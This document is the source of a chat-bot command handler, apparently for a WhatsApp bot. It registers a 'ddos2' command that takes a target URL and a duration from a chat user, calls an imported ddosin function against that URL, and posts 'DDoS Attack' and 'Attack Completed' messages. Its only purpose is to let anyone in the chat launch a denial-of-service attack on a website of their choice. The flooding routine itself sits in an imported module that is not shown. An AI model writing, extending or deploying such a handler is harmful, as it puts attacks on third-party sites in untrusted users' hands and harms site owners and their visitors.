const fs = require('fs');
const Jimp = require('jimp');
import { ddosin } from "../../lib/ddos.js"

let handler = async (m, { conn, command, usedPrefix, args }) => {
    if (!args[0] || !args[1]) return conn.reply(m.chat, `• *Example :* ${usedPrefix}${command} https://example.com 120`, m);
    
    let targetUrl = args[0];
    let duration = parseInt(args[1]);
    
    // Initiate DDoS attack
    let attack = await ddosin(targetUrl);
    
    // Send initial message
    let text = 'DDoS Attack\n\n';
    text += '```Target:```' + ` ${targetUrl}\n`;
    text += '```Time:```' + ` ${duration}\n`;
    text += '```Method:```' + ` Mix`;
    let initialMessage = await conn.reply(m.chat, text, m);
    
    // Send success message after duration
    setTimeout(() => {
        let successText = 'DDoS Attack Completed\n\n';
        successText += '```Target:```' + ` ${targetUrl}\n`;
        successText += '```Time:```' + ` ${duration}\n`;
        successText += '```Method:```' + ` Mix`;
        conn.reply(m.chat, successText, initialMessage);
    }, duration * 1000); // Convert seconds to milliseconds
}

handler.command = ["ddos2"];

export default handler;
